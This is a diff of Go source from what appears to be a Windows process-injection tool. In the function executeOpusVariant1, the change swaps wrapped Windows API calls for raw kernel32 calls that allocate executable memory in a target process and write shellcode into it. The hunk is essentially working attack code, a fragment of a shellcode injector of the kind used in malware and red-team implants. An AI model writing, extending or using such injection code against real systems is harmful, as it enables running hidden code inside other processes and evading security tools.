@@ -246,23 +246,30 @@ func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
 	output += fmt.Sprintf("[+] Pointer encoding cookie: 0x%X\n", pointerCookie)
 
 	// Step 8: Allocate memory for shellcode
-	shellcodeAddr, err := windows.VirtualAllocEx(
-		hProcess,
+	// Use kernel32 proc calls (defined in vanillainjection.go)
+	shellcodeAddr, _, allocErr := procVirtualAllocEx.Call(
+		uintptr(hProcess),
 		0,
 		uintptr(len(shellcode)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_EXECUTE_READWRITE,
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_EXECUTE_READWRITE),
 	)
-	if err != nil {
-		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
+	if shellcodeAddr == 0 {
+		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", allocErr)
 	}
 	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)
 
 	// Step 9: Write shellcode
 	var bytesWritten uintptr
-	err = windows.WriteProcessMemory(hProcess, shellcodeAddr, &shellcode[0], uintptr(len(shellcode)), &bytesWritten)
-	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
+	ret, _, writeErr := procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		shellcodeAddr,
+		uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", writeErr)
 	}
 	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)
 
